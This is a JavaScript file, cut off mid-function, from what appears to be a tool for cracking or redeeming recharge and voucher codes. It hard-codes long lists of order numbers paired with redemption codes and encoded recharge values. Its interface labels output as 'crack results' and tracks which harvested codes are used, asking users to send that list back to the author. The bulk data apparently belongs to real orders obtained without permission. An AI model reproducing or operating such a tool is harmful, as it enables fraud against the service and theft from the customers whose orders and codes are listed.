var bannedKeys = ["aXJzdHRlc3Q="];
var myList = [];
var usedList = [];
var preset = [];
var presetX = 
[
"EO2017091303036658453@064ac303a5d6@",
"EO2017091303036661701@b7c82bf2b7bc@",
"EO2017091303036670840@b59761c7105c@",
"EO2017091303036665904@d2d9fa43c4e2@",
"EO2017091303036656666@b23de965a5aa@",
"EO2017091303036658678@c0b8bafdaeee@",
"EO2017091303036664413@b2f488855130@",
"EO2017082303036386287@f5ae41851eb3@",
"EO2017091303036663300@c3750f6dc624@",
"EO2017090603036594827@e21c43e3d581@",
"EO2017083003036460875@c0f66bda0047@",
"EO2017081603036213908@a7f1847f72df@",
"EO2017091303036666030@c98494796b74@",
"EO2017083003036458350@d99f040bc058@",
"EO2017091303036664306@bfdd72edcb4f@",
"EO2017082303036382387@db8860b6c8db@",
"EO2017082303036386647@f69518146f13@"];

var preset4 = [
"EO2017092703036930490@b6abc56bc45a@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0UHDDD6TGKmZmPSHFYKmGL17nuRgUpHlT2aBuNTC8Jqw=@",
"EO2017092703036942064@ea148f7a797d@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0A2+EdRd5/t87CZkqqfiVVtC9etTKWUSn2aBuNTC8Jqw=@",
"EO2017092703036937044@fd5460a65a81@UmGdgjarlMiIaazfERBDfCW5IMR+pYC08iuscTIOKGFRpJVhQ7c8HUSayrObvH1m2aBuNTC8Jqw=@",
"EO2017092703036924573@d2f7fe02cc1b@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0FKsBCgRA1IofK63mVA1scJ4Y5M5ccYpW2aBuNTC8Jqw=@",
"EO2017092703036926522@e1dcc8e9b71a@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0zPc0EaXLm1pxPvBD7zjjxHzGLS+GPjdT2aBuNTC8Jqw=@",
"EO2017092703036936069@a9f6afbfb0b0@UmGdgjarlMiIaazfERBDfCW5IMR+pYC00gS6tlQ36rga7hNvFpPqJf5BNl39xr502aBuNTC8Jqw=@",
"EO2017092703036934160@aea671e7fba7@UmGdgjarlMiIaazfERBDfCW5IMR+pYC05CKPqZnASUmfM1k6bwP23yIi1bb49VhQ2aBuNTC8Jqw=@",
"EO2017092703036941113@fdc19c57a077@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0RBNs9EtLbU8Cy6e4xbfNqDH/VRv/Xv8Z2aBuNTC8Jqw=@",
"EO2017092703036941990@e445e5564020@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0RrL4uOFUkeJRpJVhQ7c8HcjoYCtZViT32aBuNTC8Jqw=@",
"EO2017092703036933529@acef908a6ace@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0bLHG3lTC+QdMCaG3jx07Wl+PifzKjvRv2aBuNTC8Jqw=@",
"EO2017092703036943102@feca6b90d9bc@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0M7iCWZyIZRhzTJ48rAhXqOAnQjDa+ybf2aBuNTC8Jqw=@",
"EO2017092703036924473@d4cd3ac5bf6e@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0jAPccHWUEiZzTJ48rAhXqEtdM75DKoWl2aBuNTC8Jqw=@",
"EO2017092003036769479@ecef07f1cde9@UmGdgjarlMiIaazfERBDfAPv12XU9g5BHwIuLaCmaDYSVqTHA941WM1xcdtV7gRH2aBuNTC8Jqw=@",
"EO2017091303036657663@badff3765fac@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPqU1jY04CM80SVqTHA941WM1xcdtV7gRH2aBuNTC8Jqw=@",
"EO2017092003036770436@e19c913d9090@UmGdgjarlMiIaazfERBDfAPv12XU9g5Bs6qITLiWXtxxPvBD7zjjxFANqyfAJoca2aBuNTC8Jqw=@",
"EO2017092703036929493@de79da2a140e@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0blWmDpbxD29xPvBD7zjjxF0dSlvzbcE+2aBuNTC8Jqw=@",
"EO2017092703036936112@e3a4a359ca44@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0NlQnCIgOtxPZmwYQzEdtZc/EvakyVaxR2aBuNTC8Jqw=@",
"EO2017092703036923548@dbedf67a1d1b@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0HvyTSeEIACB+3aFHOlAjJzJNWmJbkXdZ2aBuNTC8Jqw=@",
"EO2017092703036939039@c86957183647@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0qC+EvEnR91NKqnoztl8w38b1z/sdr/Et2aBuNTC8Jqw=@",
"EO2017092703036937010@c63858c0add1@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0AT/mwsgg+ss7CZkqqfiVVgPuFc/qb39l2aBuNTC8Jqw=@",
"EO2017092703036924456@aa2b968781a7@UmGdgjarlMiIaazfERBDfCW5IMR+pYC01pd0j/OQJyFRpJVhQ7c8HX7oVqPpTuQO2aBuNTC8Jqw=@",
"EO2017092703036933447@eaa3222eceda@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0Ax2rQhfXiPR+3aFHOlAjJxh3l6xQkV7e2aBuNTC8Jqw=@",
"EO2017092703036935113@ab0554a99609@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0Brw/B5hufiYCy6e4xbfNqEjEjgmZGYli2aBuNTC8Jqw=@",
"EO2017092703036924549@f23b546df008@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0cQeZrKU5jsRSnw1jJR6aS43VbotCTbb52aBuNTC8Jqw=@",
"EO2017092003036774105@bb8a285160af@UmGdgjarlMiIaazfERBDfAPv12XU9g5BAL/x3hevI39mPSHFYKmGL78mSyoKzQND2aBuNTC8Jqw=@",
"EO2017092703036933541@f9b4106be108@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0SBFAW3n1bPgqAjao/kbwtA+vMW2P0iPw2aBuNTC8Jqw=@",
"EO2017092703036926456@ee4c2a2128fd@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0HfgB0fFjVnMfK63mVA1scG1WLoi3fv0C2aBuNTC8Jqw=@",
"EO2017092703036933400@b1de1d4b9fbf@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0+l+0GUXOQBmlBmspJuqgAv55Nn2vy6pV2aBuNTC8Jqw=@",
"EO2017092703036930437@dc249dca2e7b@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0yS/NnsMWjCQ7CZkqqfiVVnImpUoAPrze2aBuNTC8Jqw=@",
"EO2017092703036944005@bfb15b723810@UmGdgjarlMiIaazfERBDfCW5IMR+pYC04NtYic3m7iSlBmspJuqgAlS2zdjXbmBN2aBuNTC8Jqw=@",
"EO2017092703036936141@ec1b943b6a23@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0FgWk27z+wNNxPvBD7zjjxKx8ygVXDfcu2aBuNTC8Jqw=@",
"EO2017091303036658442@ea40f45c1b5e@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPl+ju2hYRNf5Snw1jJR6aS43VbotCTbb52aBuNTC8Jqw=@",
"EO2017092703036927555@afe03f72be33@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0cGDT1qB4y0hMCaG3jx07WprkgLQKjf6y2aBuNTC8Jqw=@"
];

var preset3 =[
"EO2017092003036773146@fe534e9ac97e@UmGdgjarlMiIaazfERBDfAPv12XU9g5BKYmkPpx0aa1RpJVhQ7c8HfAO0h+7FhQf2aBuNTC8Jqw=@",
"EO2017092003036770284@f611c0fc9c6f@UmGdgjarlMiIaazfERBDfAPv12XU9g5BeYbxuwgI4F8qAjao/kbwtO47EaWFB3f02aBuNTC8Jqw=@",
"EO2017092003036767332@f312ade872ef@UmGdgjarlMiIaazfERBDfAPv12XU9g5BTx7Dbl5K3E0qAjao/kbwtNNcbyhMxC1d2aBuNTC8Jqw=@",
"EO2017092003036772286@bf1708d6662c@UmGdgjarlMiIaazfERBDfAPv12XU9g5BlarQjaVBdhFmjJWAtZ7713upaVDOS9CJ2aBuNTC8Jqw=@",
"EO2017092003036768334@b1b7ed845433@UmGdgjarlMiIaazfERBDfAPv12XU9g5B9myhNWHdLiNSnw1jJR6aS3zy9OYfMLQT2aBuNTC8Jqw=@",
"EO2017092003036774870@b30b5dd0672a@UmGdgjarlMiIaazfERBDfAPv12XU9g5B9+VINoSAP/xxPvBD7zjjxINPg2gG1hRo2aBuNTC8Jqw=@",
"EO2017092003036766713@aa7ead28a182@UmGdgjarlMiIaazfERBDfAPv12XU9g5B3eWFBnvwW0XxSR5I4zD0QZy3e4YC1g1Q2aBuNTC8Jqw=@",
"EO2017092003036774266@d7dbd8be2625@UmGdgjarlMiIaazfERBDfAPv12XU9g5Bib11dO1YhsIy8msexwur14Y5HGfFDi0x2aBuNTC8Jqw=@",
"EO2017092003036774215@b847bfdd74d2@UmGdgjarlMiIaazfERBDfAPv12XU9g5BG7tjHAIrKTxvsZKMZZ+3tGhTTAeb+8pn2aBuNTC8Jqw=@",
"EO2017092003036774903@f18ccca1c94e@UmGdgjarlMiIaazfERBDfAPv12XU9g5BbqxHAstdaKZMCaG3jx07WtT8toUhxhUs2aBuNTC8Jqw=@",
"EO2017092003036774070@efae06a2d485@UmGdgjarlMiIaazfERBDfAPv12XU9g5BZCLrGoYYRaRRpJVhQ7c8HZ4VIrxHg3ZL2aBuNTC8Jqw=@",
"EO2017092003036773421@d79ee2f6950b@UmGdgjarlMiIaazfERBDfAPv12XU9g5BOvYIpaq2bBMCy6e4xbfNqFL5oDo/txAA2aBuNTC8Jqw=@",
"EO2017092003036773961@bad11a96289a@UmGdgjarlMiIaazfERBDfAPv12XU9g5BjP71R9QPiANxPvBD7zjjxL49NcvCWute2aBuNTC8Jqw=@",
"EO2017092003036773364@c33acecf9148@UmGdgjarlMiIaazfERBDfAPv12XU9g5BGutUdeP+7ZdSnw1jJR6aS5eGHTrRhx0D2aBuNTC8Jqw=@",
"EO2017092003036773196@b7c057fe8633@UmGdgjarlMiIaazfERBDfAPv12XU9g5BnitJ0QC1pfMJuc2lL3vQVHrOkNulNdyu2aBuNTC8Jqw=@",
"EO2017092003036773143@cbc05a10d740@UmGdgjarlMiIaazfERBDfAPv12XU9g5BvQLnmjHMX6gSVqTHA941WCXd9RrJlhMi2aBuNTC8Jqw=@",
"EO2017092003036772523@b7ddb27f78ba@UmGdgjarlMiIaazfERBDfAPv12XU9g5BJAu7G4KrcaxxPvBD7zjjxPhja9DU9Z+J2aBuNTC8Jqw=@",
"EO2017092003036773133@a91f7b0f3a93@UmGdgjarlMiIaazfERBDfAPv12XU9g5BElOafH8l+BFKqnoztl8w38PQjqI2EObh2aBuNTC8Jqw=@",
"EO2017092003036772493@acac860c4e5c@UmGdgjarlMiIaazfERBDfAPv12XU9g5BITrHZG1A3NDxSR5I4zD0QdxZTikaWuAk2aBuNTC8Jqw=@",
"EO2017092003036773280@b0e20c35186b@UmGdgjarlMiIaazfERBDfAPv12XU9g5B17w46bD0aHNKqnoztl8w3x+rz7D99UOG2aBuNTC8Jqw=@",
"EO2017092003036773281@f4e23b851b97@UmGdgjarlMiIaazfERBDfAPv12XU9g5BWafOOwZiiGs7CZkqqfiVVnL11YvcZZDX2aBuNTC8Jqw=@",
"EO2017092003036771506@c5c778faa395@UmGdgjarlMiIaazfERBDfAPv12XU9g5BjlYp2AzTZE1Kqnoztl8w3zB0pN/RIXZw2aBuNTC8Jqw=@",
"EO2017092003036771320@f4c056543cf5@UmGdgjarlMiIaazfERBDfAPv12XU9g5B5jJr9wFvI0hDq95RSstVLbAoFd9GSkAJ2aBuNTC8Jqw=@",
"EO2017092003036770251@c1ea90b7535f@UmGdgjarlMiIaazfERBDfAPv12XU9g5BYl2XnSE1gcoqAjao/kbwtGj5EwKus4t+2aBuNTC8Jqw=@",
"EO2017092003036769534@bab9a303a838@UmGdgjarlMiIaazfERBDfAPv12XU9g5B1ongJSvCcYIIuCwgclqnIpSL/XC8gpWr2aBuNTC8Jqw=@",
"EO2017092003036770524@f7f4b9689d77@UmGdgjarlMiIaazfERBDfAPv12XU9g5BONXsgG6nBpEIuCwgclqnIs7hCfySrf9D2aBuNTC8Jqw=@",
"EO2017092003036772484@cc28f937c335@UmGdgjarlMiIaazfERBDfAPv12XU9g5B/qHt5vZCjm0Cy6e4xbfNqO2YQ92vH4fv2aBuNTC8Jqw=@",
"EO2017092003036770534@e8c807bbbc9a@UmGdgjarlMiIaazfERBDfAPv12XU9g5BuHiOEoOycjJmjJWAtZ7717xfHw2E4YNZ2aBuNTC8Jqw=@",
"EO2017092003036769513@af37c3e9d138@UmGdgjarlMiIaazfERBDfAPv12XU9g5BGRZmsyW5H81+3aFHOlAjJ9y1O5DfJnbt2aBuNTC8Jqw=@",
"EO2017092003036769302@e0c7f7e1fc82@UmGdgjarlMiIaazfERBDfAPv12XU9g5B8Rt7/h697foSVqTHA941WGF+LTqyTcrT2aBuNTC8Jqw=@",
"EO2017092003036768603@c26f60252241@UmGdgjarlMiIaazfERBDfAPv12XU9g5Bgi38/xuH4AZxPvBD7zjjxPXYBiPl0/kX2aBuNTC8Jqw=@",
"EO2017092003036769389@dc9153a461d7@UmGdgjarlMiIaazfERBDfAPv12XU9g5BrxAV3KuDndUSVqTHA941WAOgXjG54F/B2aBuNTC8Jqw=@",
"EO2017092003036772242@f0a7fcfb1109@UmGdgjarlMiIaazfERBDfAPv12XU9g5BMgCYfsp3F34qAjao/kbwtKVXhNc1Fw7T2aBuNTC8Jqw=@",
"EO2017092003036772538@e4f46b12db97@UmGdgjarlMiIaazfERBDfAPv12XU9g5BNjO0dZ6sS647CZkqqfiVVkFzdRTjp+N52aBuNTC8Jqw=@",
"EO2017092003036774904@bd7072da81d9@UmGdgjarlMiIaazfERBDfAPv12XU9g5BvCeT6tlJ1QpSnw1jJR6aS32npQV0xOC62aBuNTC8Jqw=@",
"EO2017092003036775754@dab372f6942b@UmGdgjarlMiIaazfERBDfAPv12XU9g5Bs27W4eN6JsofK63mVA1scN6q7TtIz2yF2aBuNTC8Jqw=@",
"EO2017083003036464167@e41f64333f90@UmGdgjarlMiIaazfERBDfAPv12XU9g5BJ4MocFTiSKHxSR5I4zD0QRhcA1XDTVVv2aBuNTC8Jqw=@",
"EO2017092003036773182@bf924b8379e9@UmGdgjarlMiIaazfERBDfAPv12XU9g5BcvqPkXXVFE0SVqTHA941WForpFyUnqsP2aBuNTC8Jqw=@",
"EO2017092003036767254@de5a4d503c28@UmGdgjarlMiIaazfERBDfAPv12XU9g5BUwmExGbvptvZmwYQzEdtZaXnnLVXex9N2aBuNTC8Jqw=@",
"EO2017092003036774257@de890882f356@UmGdgjarlMiIaazfERBDfAPv12XU9g5B344Y3SufJ5wIuCwgclqnIvvlE0/30N5q2aBuNTC8Jqw=@",
"EO2017092003036773962@dbe1e7793e7b@UmGdgjarlMiIaazfERBDfAPv12XU9g5B5bCeWI01xE3ZmwYQzEdtZc/EvakyVaxR2aBuNTC8Jqw=@",
"EO2017092003036771344@e4d148b66433@UmGdgjarlMiIaazfERBDfAPv12XU9g5BJC+0w25b7rDxSR5I4zD0QVm8Kh82omNO2aBuNTC8Jqw=@",
"EO2017092003036770253@e1d3609413ea@UmGdgjarlMjDqfksanOqp3ZYdimQM55GlOGHQvyuadDxSR5I4zD0QVm8Kh82omNO2aBuNTC8Jqw=@",
"EO2017092003036766453@ace4bd2c0194@UmGdgjarlMiIaazfERBDfAPv12XU9g5Btg59b9KCjd4Cy6e4xbfNqJzR2tfr0a3u2aBuNTC8Jqw=@",
"EO2017061403034673007@79077a7fa4ea@UmGdgjarlMiIaazfERBDfAPv12XU9g5Bt/3CkcySd/oCy6e4xbfNqGGZj0LAAc+l2aBuNTC8Jqw=@",
"EO2017092003036765691@bdd931ab8e91@UmGdgjarlMgUUcyuaagJodPD9QbtjI7PwezQrYo+5mI7CZkqqfiVVo2WdW3eoL/a2aBuNTC8Jqw=@",
"EO2017092003036773362@f18976e94056@UmGdgjarlMiIaazfERBDfAPv12XU9g5BCYQWDRtUsOkqAjao/kbwtE6yjnv8pgdK2aBuNTC8Jqw=@",
"EO2017092003036770365@fe85c18b03b8@UmGdgjarlMiIaazfERBDfAPv12XU9g5Bu5ksrg6Q1HAqAjao/kbwtMmzYvw0PFW22aBuNTC8Jqw=@",
"EO2017092003036766657@f8307d247e6e@UmGdgjarlMiIaazfERBDfAPv12XU9g5ByNiLF5vKDwFMCaG3jx07WlAJ5mmhALTy2aBuNTC8Jqw=@",
"EO2017092003036769272@d489add95d54@UmGdgjarlMiIaazfERBDfAPv12XU9g5B9Kz1+9bM0g5MCaG3jx07WrOaiQ6GnK7+2aBuNTC8Jqw=@",
"EO2017092003036774843@bbf1cd22243c@UmGdgjarlMiIaazfERBDfAPv12XU9g5BMQT21TkTCHYqAjao/kbwtP0ySAqvEF292aBuNTC8Jqw=@",
"EO2017062103034903945@b7ada896fd8c@UmGdgjarlMgUUcyuaagJoXIIQ3DK44FstrcNtciDMuA7CZkqqfiVVo2WdW3eoL/a2aBuNTC8Jqw=@",
"EO2017092003036773426@c3dc0b21a9bc@UmGdgjarlMiIaazfERBDfAPv12XU9g5Bkd8sbdS6qpJmPSHFYKmGL+nrDqMq+oc82aBuNTC8Jqw=@",
"EO2017092003036767430@c002d98a1065@UmGdgjarlMiIaazfERBDfAPv12XU9g5BsXLlYQ2yNw5mPSHFYKmGL9b+U0ND0grR2aBuNTC8Jqw=@",
"EO2017092003036765718@d4f3afae8bd2@UmGdgjarlMiIaazfERBDfAPv12XU9g5B6ttOHBSMHv8SVqTHA941WASQSVUfzk2v2aBuNTC8Jqw=@",
"EO2017091303036666900@e3f18f0a205a@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPOe+u0UX6+28Cy6e4xbfNqJzR2tfr0a3u2aBuNTC8Jqw=@",
"EO2017092003036768569@c074608ad8c2@UmGdgjarlMiIaazfERBDfAPv12XU9g5BL1qgOZav9BAqAjao/kbwtHa67u1ufjFw2aBuNTC8Jqw=@",
"EO2017092003036773190@d6dd845dce5c@UmGdgjarlMiIaazfERBDfAPv12XU9g5BFK+wQF4UwCfxSR5I4zD0QSiS+AE9Iv952aBuNTC8Jqw=@",
"EO2017092003036773373@b70c4c73ede3@UmGdgjarlMiIaazfERBDfAPv12XU9g5B030PPe0zeyrxSR5I4zD0QUrrInJZPhIJ2aBuNTC8Jqw=@",
"EO2017092003036771215@dddacdc2b6c9@UmGdgjarlMiIaazfERBDfAPv12XU9g5B3SeS/crjXsMqAjao/kbwtIcoUxzp+6oI2aBuNTC8Jqw=@",
"EO2017091303036660686@fa921f6ee3e6@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPaDc2Dtoff54a7hNvFpPqJWGjyeYSVJeo2aBuNTC8Jqw=@",
"EO2017092003036769405@dbcb91a5c0e7@UmGdgjarlMiIaazfERBDfAPv12XU9g5B/LI2Xr4WiAEa7hNvFpPqJWGjyeYSVJeo2aBuNTC8Jqw=@",
"EO2017083003036460981@ef3d68dad1d6@UmGdgjarlMjDqfksanOqp3ZYdimQM55Gp7hxblE0zag7CZkqqfiVVpz7JKZLIZ7P2aBuNTC8Jqw=@",
"EO2017091303036659690@d65ba7a72ce4@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPDj/nzFKLNW47CZkqqfiVVpz7JKZLIZ7P2aBuNTC8Jqw=@",
"EO2017092003036764672@a924d3a9e45b@UmGdgjarlMiIaazfERBDfAPv12XU9g5BFxZECvB/BKlxPvBD7zjjxFsDjI6drRMF2aBuNTC8Jqw=@",
"EO2017092003036774091@beca3813c58c@UmGdgjarlMiIaazfERBDfAPv12XU9g5BE3L3IgjrZEg7CZkqqfiVVpz7JKZLIZ7P2aBuNTC8Jqw=@",
"EO2017091303036666029@eaf46bf979dd@UmGdgjarlMiIaazfERBDfP3ssEHW4oDP7BDEfbhPcaVRpJVhQ7c8Ha1i9zPnaYlG2aBuNTC8Jqw=@",
"EO2017092003036767394@ca1d04c90093@UmGdgjarlMiIaazfERBDfAPv12XU9g5Bhoo1XxEytZr+D3i4Q10XTG4iTlSOcAct2aBuNTC8Jqw=@",
"EO2017083003036462886@fd675a153c6c@UmGdgjarlMjDqfksanOqp3ZYdimQM55GLwFJKsA8YthRpJVhQ7c8Ha1i9zPnaYlG2aBuNTC8Jqw=@",
"EO2017092003036768564@f3e7772e450e@UmGdgjarlMiIaazfERBDfAPv12XU9g5BrmMfkZ5PBO8qAjao/kbwtHaCF0ZYtT7k2aBuNTC8Jqw=@",
"EO2017092003036773356@e294f3587a83@UmGdgjarlMiIaazfERBDfAPv12XU9g5Bo2+VXHpquAZRpJVhQ7c8Ha99nqEgTS/62aBuNTC8Jqw=@",
"EO2017083003036461938@d1a13bb19915@UmGdgjarlMjDqfksanOqp3ZYdimQM55GRpH0TjuoI4hRpJVhQ7c8HW8Ur3IBCn+o2aBuNTC8Jqw=@",
"EO2017092003036770322@bbd5e7ab54ca@UmGdgjarlMiIaazfERBDfAPv12XU9g5BBcFMVbeppocqAjao/kbwtJC/8aA9ju+H2aBuNTC8Jqw=@",
"EO2017092003036772361@bd7ea3071a64@UmGdgjarlMiIaazfERBDfAPv12XU9g5BuCA6fqzDn8gqAjao/kbwtA8E3v9TKZLz2aBuNTC8Jqw=@",
"EO2017092003036767260@dbdb15b97636@UmGdgjarlMiIaazfERBDfAPv12XU9g5BeDfJpNhmGf0qAjao/kbwtNQV29k+LK8h2aBuNTC8Jqw=@",
"EO2017092003036766597@e2d01182aff6@UmGdgjarlMiIaazfERBDfAPv12XU9g5B2EaCbBey47VKqnoztl8w3wo8H6lw50aL2aBuNTC8Jqw=@",
"EO2017092003036770364@db56ac843891@UmGdgjarlMiIaazfERBDfAPv12XU9g5BrqIx8l0Fr9JxPvBD7zjjxPintZJTI9A32aBuNTC8Jqw=@",
"EO2017092003036771300@be9009d7fc1d@UmGdgjarlMiIaazfERBDfAPv12XU9g5B9jyS45g6EV5Kqnoztl8w32un+oWEFIGi2aBuNTC8Jqw=@",
"EO2017091303036667900@f324a3fbcd18@UmGdgjarlMiIaazfERBDfP3ssEHW4oDP14K7O1onj/tSnw1jJR6aS+ph4kVH4yoF2aBuNTC8Jqw=@",
"EO2017072603035989919@6f106e34b96e@UmGdgjarlMiF7fb2WHgbz9DPktLdrS3WN/U7kGUytV5Snw1jJR6aS+ph4kVH4yoF2aBuNTC8Jqw=@",
"EO2017071903035766971@524f7bf476c2@UmGdgjarlMiF7fb2WHgbz94200AjVXHlmwYyCovPEI9Snw1jJR6aS+ph4kVH4yoF2aBuNTC8Jqw=@",
"EO2017060703034466424@779a833b841c@UmGdgjarlMgUUcyuaagJoY3c9V33fSnIoPZC+4jRAy5Snw1jJR6aS+ph4kVH4yoF2aBuNTC8Jqw=@",
"EO2017092003036771348@e833f7a4fe4d@UmGdgjarlMiIaazfERBDfAPv12XU9g5BZqrKmx+0iRoqAjao/kbwtOYR5UOcJPnp2aBuNTC8Jqw=@",
"EO2017092003036773200@fa1941b3f911@UmGdgjarlMiIaazfERBDfAPv12XU9g5B9KRM1Qvqu+QqAjao/kbwtL6qbS+XoOqc2aBuNTC8Jqw=@",
"EO2017091303036664923@06f001c4b62f@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPKm8Gxs/hwjg7CZkqqfiVVtUA80BnuMHA2aBuNTC8Jqw=@",
"EO2017091303036661409@af4cd9b289e1@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPq9iJyHr7D0cCy6e4xbfNqGU7pCFx4g3c2aBuNTC8Jqw=@",
"EO2017091303036658385@d74cd5f0f9e4@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPPFZRx4iLeZ9nGXUP+TBJCqdICk4VAy5j2aBuNTC8Jqw=@",
"EO2017091303036656450@f672f476964c@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPb2asya/AvJ1xPvBD7zjjxNbNiXpB8S7u2aBuNTC8Jqw=@",
"EO2017091303036661375@c35da0dcc519@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPUBWIkfZTWjylBmspJuqgAnnaO4iP8n6C2aBuNTC8Jqw=@",
"EO2017091303036656483@f2d6d6b07e8d@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPKoiPvY2dHqFnGXUP+TBJCr/p9oybzaZd2aBuNTC8Jqw=@",
"EO2017091303036659456@c5c4abac1b17@UmGdgjarlMiIaazfERBDfP3ssEHW4oDP4c3XUthQ9hNxPvBD7zjjxKa5eFMaXHQS2aBuNTC8Jqw=@",
"EO2017082303036385558@ffe311ccb59e@UmGdgjarlMjDqfksanOqpwflaCUwKft42qxuUPqjESoIuCwgclqnIgZV3fDrqAIc2aBuNTC8Jqw=@",
"EO2017083003036460982@cbcac9081bdb@UmGdgjarlMjDqfksanOqp3ZYdimQM55GUlQmV9F5fZsIuCwgclqnIgZV3fDrqAIc2aBuNTC8Jqw=@",
"EO2017090603036596830@045781548c13@UmGdgjarlMiIaazfERBDfB0nAj8bV2bOgYwBJ8fsYTMa7hNvFpPqJVUSgXSkhdMY2aBuNTC8Jqw=@",
"EO2017083003036456138@cffbde07d911@UmGdgjarlMjDqfksanOqp3ZYdimQM55GTMgD4ULYBk/xSR5I4zD0QeCD7Gvt2q4L2aBuNTC8Jqw=@",
"EO2017083003036461060@efb00f8129d4@UmGdgjarlMjDqfksanOqp3ZYdimQM55GDY4OQL9veKhSnw1jJR6aS6bcwxC63WyH2aBuNTC8Jqw=@",
"EO2017080203036054595@8169fe20d683@UmGdgjarlMjDqfksanOqp1pIb3DQXe+elLb2M53GhTsa7hNvFpPqJQQHxScasWI92aBuNTC8Jqw=@",
"EO2017092003036765565@f3329b8e5853@UmGdgjarlMiIaazfERBDfAPv12XU9g5Bg/dBAwwHvQxKqnoztl8w3ygU4czbOwyy2aBuNTC8Jqw=@",
"EO2017092003036764701@ca02b092f625@UmGdgjarlMiIaazfERBDfAPv12XU9g5BAhWGsSJR8FAqAjao/kbwtJ3352RbSbsd2aBuNTC8Jqw=@",
"EO2017091303036660366@da491479e97b@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPukWQrd8P1lBMCaG3jx07WtOfguT6sQXA2aBuNTC8Jqw=@",
"EO2017082303036384343@e7f3893834af@UmGdgjarlMjDqfksanOqpwflaCUwKft4YC/LdvhWwmlSnw1jJR6aS93sjVuMDHvu2aBuNTC8Jqw=@",
"EO2017090603036595936@01f3a7282b12@UmGdgjarlMiIaazfERBDfB0nAj8bV2bO/RsnRg16K+FxPvBD7zjjxNOHRz/B6wJR2aBuNTC8Jqw=@",
"EO2017090603036590076@e12eb5edaed8@UmGdgjarlMiIaazfERBDfB0nAj8bV2bOOJSMj1BPSvlSnw1jJR6aS93sjVuMDHvu2aBuNTC8Jqw=@",
"EO2017092003036765510@ef2ea2bedf9a@UmGdgjarlMiIaazfERBDfAPv12XU9g5BRtI7Tc9tB9JKqnoztl8w34eB3OSiHr2o2aBuNTC8Jqw=@",
"EO2017092003036765706@f897a6e7db1e@UmGdgjarlMiIaazfERBDfAPv12XU9g5BalAppyQVM2RKqnoztl8w3ybww3offO722aBuNTC8Jqw=@",
"EO2017091303036661501@e7fcd5dbe849@UmGdgjarlMiIaazfERBDfP3ssEHW4oDP/bSTM6m6NapxPvBD7zjjxNOHRz/B6wJR2aBuNTC8Jqw=@",
"EO2017092003036769509@f83ac743d8e2@UmGdgjarlMiIaazfERBDfAPv12XU9g5BpyeAenjK/75MCaG3jx07WgW39q6NRtsN2aBuNTC8Jqw=@",
"EO2017092003036774061@ddcccf191cc0@UmGdgjarlMiIaazfERBDfAPv12XU9g5BLLlqsjlETcRKqnoztl8w34osC9/QM+uf2aBuNTC8Jqw=@",
"EO2017092003036773244@e07e228a6522@UmGdgjarlMiIaazfERBDfAPv12XU9g5BbL1P6GjEy5U7CZkqqfiVVvm3A4v9wr9p2aBuNTC8Jqw=@",
"EO2017092003036766567@f83dde391a45@UmGdgjarlMiIaazfERBDfAPv12XU9g5BoK//SHr0PtNxPvBD7zjjxE1dWH49lHkv2aBuNTC8Jqw=@",
"EO2017092003036765711@f727321d9458@UmGdgjarlMiIaazfERBDfAPv12XU9g5BwNq/+VB85vFKqnoztl8w31GPr/FjjfOK2aBuNTC8Jqw=@"
];

var used = [];
var rest = 0;
var showIn = function(){
  $("#in").append("<input type=text class=form-control id=orderId placeholder=订单号> <input type=text class=form-control id=mobile placeholder=手机号><input type=text class=form-control id=code placeholder=兑换码><input type=text class=form-control id=enc placeholder=充值码><textarea id=preset class=form-control placeholder='预设订单和兑换码，以便快速获取地址。格式为 订单号@兑换码@手机号 如 EO2017082303123456789@abcdefg@13588888888 一行一条数据' style='height:200px;font-size: 11px;'></textarea><textarea id=result class=form-control placeholder='破解结果(更新日期2017-09-24 15:20)' style='height:200px'></textarea><iframe id=frame src='' style='position: fixed; border: 1px solid black; top: 0px; right: 0px;background-color: yellow;width: 40%;height: 20%;'>");
  $("#yql").attr("onclick", "getEnc()");
  $("#charge").remove();
  $("#frame").remove();
  $("#yql").text("获取链接");
  var param = location.hash.split("#")[1];
  preset = window["preset" + param];
  
  var latest = removeUsed(preset);
  rest = latest.length;
  localStorage.preset = latest.join("\r\n");
  var pl = $("#result").attr("placeholder") + " 现在是: preset" + param + " 剩余码子数量：" + rest;	
  $("#result").attr("placeholder", pl);
  if(localStorage.preset.length == 0){
   prompt("复制里面的内容并发我，检查码子使用情况", localStorage.used);
  }
	
  if(localStorage.rm){
  	used = localStorage.rm.split(",");
  }
	
  $("#clear").on("click", clear);
  var p = $("#preset");
  p.val(localStorage.preset);
  p.scrollTop(p[0].scrollHeight);
}

var removeUsed = function(){
 if(!localStorage.used){
     localStorage.used = usedList;
    }else{
     usedList = localStorage.used.split(",");
    }
 var result = [];
 preset.forEach(function(code){
  if(usedList.indexOf(code) == -1){
   result.push(code);
  }
 });
 return result;
}

var check = function() {
